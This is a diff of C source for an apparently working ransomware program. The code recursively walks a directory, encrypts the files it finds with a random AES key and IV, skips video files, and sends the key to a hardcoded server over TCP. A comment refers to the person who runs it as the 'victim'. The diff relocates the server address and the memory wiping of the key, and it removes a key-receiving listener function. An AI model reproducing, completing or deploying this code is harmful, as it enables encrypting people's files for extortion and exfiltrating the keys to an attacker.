@@ -15,8 +15,6 @@
 #include <arpa/inet.h>
 
 #define BUFFER_SIZE 1024
-char *server_ip = "127.0.0.1";// IP is hardcoded, victim can't change it -> alternative is to use a Domain Name
-
 
 void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, char * mode);
 bool doUseFile(const char *filename);
@@ -39,9 +37,6 @@ int main(int argc, char* argv[]){
         RAND_priv_bytes(iv, 16);
 
         sendKey(key,iv);
-        // erase key from memory -> fills the memory with 0's
-        memset(key, 0, sizeof(key));
-        memset(iv, 0, sizeof(iv));
     }
     // if mode is -d, read key and iv from files
     else if(strcmp(argv[2],"-d") == 0){
@@ -60,7 +55,7 @@ int main(int argc, char* argv[]){
     }
 
     // argv[2] -> -e = encrypt, -d = decrypt
-    if(argc == 3){ //argv[0] = program name, argv[1] = path, argv[2] = mode > argc = 3 -> the arguments are interpreted in the dirContent function
+    if(argc == 3){ //argv[0] = program name, argv[1] = path, argv[2] = mode > argc = 3 -> interpreted in dirContent
         dirContent(argv[1],key,iv,argv[2]);
     }
     else{
@@ -75,7 +70,11 @@ int main(int argc, char* argv[]){
             return 0;
         }
     }
+    // clean the key and iv from memory
+    memset(key, 0, 32);
+    memset(iv, 0, 16);
 
+    
     return 0;
 }
 
@@ -92,8 +91,8 @@ void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, cha
 
     while (sd!= NULL){
 
-        if(sd -> d_type == DT_DIR && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ // verify if the  sd is a directory, and ignore . and .. who are the current or parent directory
-            char* new_path = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2); // we allocate memory for the new path with the size of the rootpath + the size of the name of the directory + 2 for the / and the \0 
+        if(sd -> d_type == DT_DIR && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){  //check if the path is a directory and not the current or parent directory(. and ..)
+            char* new_path = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2); //allocate memory for the new path with the size of the rootpath + the size of the directory name + 2 for the "/" and the null character at the end 
             strcpy(new_path,""); // clean memory of the variable
             strncat(new_path,rootpath,strlen(rootpath));
             strcat(new_path,"/");
@@ -104,7 +103,7 @@ void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, cha
         }
 
         else{
-            if( sd -> d_type == DT_REG && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ //verify if the file is a regular file and not the current or parent directory
+            if( sd -> d_type == DT_REG && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ //check if the file is a regular file and not the current or parent directory
                 char* filepath = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2);
                 strcpy(filepath,""); // clean memory of the variable
                 strncat(filepath,rootpath,strlen(rootpath));
@@ -135,8 +134,8 @@ void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, cha
 }
 
 bool doUseFile(const char *filename){
-// if file is a video, return false
-    if(strstr(filename,".mp4") != NULL || strstr(filename,".avi") != NULL || strstr(filename,".mkv") != NULL || strstr(filename,".mov") != NULL || strstr(filename,".flv") != NULL || strstr(filename,".wmv") != NULL || strstr(filename,".mpg") != NULL || strstr(filename,".m4v") != NULL || strstr(filename,".webm") {
+// if the file is a video extension, return false
+    if(strstr(filename,".mp4") != NULL || strstr(filename,".avi") != NULL || strstr(filename,".mkv") != NULL || strstr(filename,".mov") != NULL || strstr(filename,".flv") != NULL){
         return false;
     }
     else{ 
@@ -307,6 +306,7 @@ int sendKey(unsigned char *key, unsigned char *iv){
     // create a socket
     int sockid = socket(AF_INET, SOCK_STREAM, 0);
     int server_port= 9999;
+    char *server_ip = "127.0.0.1"; // IP is hardcoded, victim can't change it -> alternative is to use a Domain Name
 
     struct sockaddr_in server_addr;
     server_addr.sin_family = AF_INET;
@@ -324,49 +324,3 @@ int sendKey(unsigned char *key, unsigned char *iv){
     return 0;
 }
 
-int getKey(){
-        // create a socket
-    int sockid = socket(AF_INET, SOCK_STREAM, 0);
-    int server_port= 9998;
-
-
-    sockid= socket(AF_INET, SOCK_STREAM, 0);
-
-    struct sockaddr_in server_addr, client_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(server_port);
-    server_addr.sin_addr.s_addr = inet_addr(server_ip);
-
-    char *buffer[BUFFER_SIZE];
-    int n, len, client_socket;
-
-    int bind_result = bind(sockid, (struct sockaddr*)&server_addr, sizeof(server_addr));
-
-    if(bind_result < 0){
-        perror("Bind error");
-        exit(1);
-    }
-    else{
-        printf("server is listening on port %s:%d\n", server_ip,server_port);
-        n = listen(sockid, 1);
-
-        len = sizeof(client_addr);
-        client_socket = accept(sockid, (struct sockaddr*)&client_addr, &len);
-
-        printf("accepted connection from %d %s:%d\n",
-            client_socket,
-            inet_ntoa(client_addr.sin_addr),
-            ntohs(client_addr.sin_port));
-        
-        // receive key and iv from client and store it in binary files
-        n = recv(client_socket,(char *)buffer, BUFFER_SIZE, 0);
-        FILE *key_file = fopen("key.bin", "wb");
-        fwrite(buffer, 1, n, key_file);
-        fclose(key_file);
-
-        n = recv(client_socket,(char *)buffer, BUFFER_SIZE, 0);
-        FILE *iv_file = fopen("iv.bin", "wb");
-        fwrite(buffer, 1, n, iv_file);
-        fclose(iv_file);
-    }
-}   
